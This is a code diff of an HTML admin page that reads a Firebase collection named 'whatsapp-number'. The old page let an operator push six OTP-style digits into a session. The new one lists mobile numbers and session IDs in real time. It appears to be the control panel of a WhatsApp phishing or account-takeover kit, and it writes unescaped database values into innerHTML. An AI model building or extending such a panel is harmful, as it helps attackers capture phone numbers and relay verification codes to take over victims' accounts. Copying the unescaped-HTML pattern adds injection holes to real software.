@@ -3,93 +3,123 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Admin Panel</title>
+  <title>Admin Panel - WhatsApp Sessions</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #f3fdf6;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #25d366;
+      color: white;
       padding: 20px;
-      background: #f2f2f2;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      position: relative;
     }
 
-    h2 {
-      text-align: center;
+    .menu-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background-color: white;
       color: #25d366;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      transition: 0.3s;
     }
 
-    .field {
-      margin-bottom: 15px;
+    .menu-btn:hover {
+      background-color: #eafaf0;
     }
 
-    input[type="text"] {
-      padding: 10px;
-      font-size: 16px;
+    .table-container {
+      padding: 20px;
+      max-width: 1000px;
+      margin: 0 auto;
+      overflow-x: auto;
+    }
+
+    table {
       width: 100%;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-
-    .otp-container {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      margin: 20px 0;
-    }
-
-    .otp-box {
-      width: 50px;
-      height: 60px;
-      font-size: 28px;
-      text-align: center;
+      border-collapse: collapse;
+      background: white;
       border-radius: 10px;
-      border: 2px solid #ccc;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.05);
     }
 
-    button {
-      background: #25d366;
+    th, td {
+      padding: 16px;
+      text-align: left;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    th {
+      background-color: #eafaf0;
+      color: #25d366;
+      font-size: 16px;
+    }
+
+    td {
+      font-size: 15px;
+    }
+
+    .copy-btn {
+      background-color: #25d366;
       color: white;
       border: none;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 8px;
+      padding: 8px 14px;
+      border-radius: 20px;
       cursor: pointer;
-      display: block;
-      margin: 20px auto;
-    }
-
-    button:hover {
-      background: #1da851;
-    }
-
-    .message {
-      text-align: center;
-      margin-top: 10px;
       font-weight: bold;
+      transition: 0.3s ease;
+    }
+
+    .copy-btn:hover {
+      background-color: #1da851;
+    }
+
+    .scroll-section {
+      height: calc(100vh - 80px);
+      overflow-y: auto;
     }
   </style>
 </head>
 <body>
+  <header>
+    Admin Panel -
+    <button class="menu-btn" onclick="openEditor()">live code change</button>
+  </header>
 
-  <h2>Admin Panel</h2>
-
-  <div class="field">
-    <label>Enter Session ID:</label>
-    <input type="text" id="sessionId" placeholder="e.g. session-abc123">
+  <div class="scroll-section">
+    <div class="table-container">
+      <table id="sessions-table">
+        <thead>
+          <tr>
+            <th>Mobile</th>
+            <th>Session ID</th>
+            <th>Copy Session ID</th>
+          </tr>
+        </thead>
+        <tbody id="session-body">
+          <!-- Data will be inserted here -->
+        </tbody>
+      </table>
+    </div>
   </div>
 
-  <div class="otp-container">
-    <input class="otp-box" maxlength="1" id="box1" />
-    <input class="otp-box" maxlength="1" id="box2" />
-    <input class="otp-box" maxlength="1" id="box3" />
-    <input class="otp-box" maxlength="1" id="box4" />
-    <input class="otp-box" maxlength="1" id="box5" />
-    <input class="otp-box" maxlength="1" id="box6" />
-  </div>
-
-  <button onclick="updateBoxes()">Update Boxes</button>
-
-  <div class="message" id="status"></div>
-
-  <!-- Firebase -->
+  <!-- Firebase Scripts -->
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 
@@ -106,25 +136,38 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    async function updateBoxes() {
-      const sessionId = document.getElementById('sessionId').value.trim();
-      if (!sessionId) return alert("Please enter a session ID");
+    const tableBody = document.getElementById("session-body");
 
-      const boxes = [];
-      for (let i = 1; i <= 6; i++) {
-        const val = document.getElementById(`box${i}`).value.trim();
-        boxes.push(val);
-      }
+    function createRow(mobile, sessionId) {
+      const tr = document.createElement("tr");
 
-      try {
-        await db.collection("whatsapp-number").doc(sessionId).update({ boxes });
-        document.getElementById("status").textContent = "Boxes updated successfully!";
-        document.getElementById("status").style.color = "green";
-      } catch (err) {
-        document.getElementById("status").textContent = "Error: " + err.message;
-        document.getElementById("status").style.color = "red";
-      }
+      tr.innerHTML = `
+        <td>${mobile || '—'}</td>
+        <td>${sessionId}</td>
+        <td><button class="copy-btn" onclick="copyToClipboard('${sessionId}')">Copy</button></td>
+      `;
+
+      return tr;
     }
+
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Copied: " + text);
+      });
+    }
+
+    function openEditor() {
+      window.open("live.html");
+    }
+
+    db.collection("whatsapp-number").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+      tableBody.innerHTML = "";
+      snapshot.forEach(doc => {
+        const data = doc.data();
+        const tr = createRow(data.mobile, doc.id);
+        tableBody.appendChild(tr);
+      });
+    });
   </script>
 </body>
 </html>
